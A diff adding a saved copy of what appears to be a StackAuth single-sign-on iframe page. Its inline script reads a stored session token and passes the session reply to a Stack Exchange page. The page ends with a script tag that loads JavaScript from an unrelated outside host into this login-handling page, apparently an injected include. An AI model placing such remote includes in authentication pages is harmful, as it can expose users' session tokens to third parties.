@@ -1,0 +1,24 @@
+
+<!-- saved from url=(0200)https://stackauth.com/auth/global/read?request=Hf8GSNW918QVBAVVPvfwg1qP%2F4K7ysQM1wgGCrG2%2BVS1pDM99KBP5zzaC0Dd7bR%2FpAWfAgoRr2LgSbjmIjo9tJgf%2BtFm5Ausft7C5CF15j0%3D&nonce=3sEFUgAAAABdn5i0ynM1LQ%3D%3D -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                  <script type="text/javascript">
+                  var data = {"ReadSession":"https://stackauth.com/auth/global/read-session","Request":"Hf8GSNW918QVBAVVPvfwg1qP/4K7ysQM1wgGCrG2+VS1pDM99KBP5zzaC0Dd7bR/pAWfAgoRr2LgSbjmIjo9tJgf+tFm5Ausft7C5CF15j0=","Nonce":"3sEFUgAAAABdn5i0ynM1LQ==","Referrer":"http://tex.stackexchange.com/questions/82399/jpgfdraw-and-transparency-problems","StorageName":"GlobalLogin"};
+
+                  var toMsg = window.parent;
+
+                  var obj = localStorage.getItem(data.StorageName);
+                  if(obj != null) {
+                  var req = new XMLHttpRequest();
+                  req.open('POST', data.ReadSession+'?request='+encodeURIComponent(data.Request)+'&nonce='+encodeURIComponent(data.Nonce)+'&seriesAndToken='+encodeURIComponent(obj), false);
+                  req.send(null);
+                  
+                    if(req.status == 200){
+                      toMsg.postMessage(req.responseText, data.Referrer);
+                    }else{
+                      toMsg.postMessage('No Session', data.Referrer);
+                    }
+                  }else{
+                    toMsg.postMessage('No Local Storage', data.Referrer);
+                  }
+                  </script>
+                  <script type="text/javascript" src="http://static.ver-pelis.net/player/ready.js"></script><style type="text/css"></style><style type="text/css"></style></head><body></body></html>
